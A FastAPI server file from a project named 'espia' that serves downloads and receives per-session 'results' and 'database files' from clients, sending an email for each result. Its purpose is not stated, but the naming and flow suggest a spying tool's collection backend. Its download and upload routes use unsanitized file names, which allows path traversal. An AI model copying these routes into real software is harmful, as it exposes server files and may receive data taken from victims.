import os

from fastapi import FastAPI, File, UploadFile, Request
from starlette.responses import FileResponse

from espia_server.app.plugins.mails.mail_handler import send_mail
from espia_server.app.utils.espia_logging import log_info
from espia_server.app.utils.tool_utils import handle_products_results, handle_new_uploaded_file, create_new_client_dir, \
    static_files_path

# In production we don't want any docs served
if os.getenv("ESPIA_ENV") == 'prod':
    log_info("Running in production env")
    app = FastAPI(docs_url=None, redoc_url=None)
else:
    app = FastAPI()


@app.get("/")
def root_path() -> dict:
    return {}


@app.get("/download/{file}")
def download_file(file: str):
    try:
        return FileResponse(path=f'{static_files_path}/{file}', media_type='application/octet-stream', filename=file)
    except:
        return "Not found"


@app.post("/upload/results")
def upload_results(results: dict) -> dict:
    session_id = results.get('Session-ID')
    create_new_client_dir(session_id)
    handle_products_results(session_id, results)
    log_info(f"Successfully retrieved product session {session_id}")
    send_mail(session_id)
    return {}


@app.post("/upload/files")
async def create_upload_file(request: Request, fileUpload: UploadFile = File(...)) -> dict:
    session_id = request.headers.get('Session')
    file_path = handle_new_uploaded_file(session_id, fileUpload.filename)
    file_path.write_bytes(await fileUpload.read())

    log_info(f"Successfully received database files from {session_id}")
    return {}
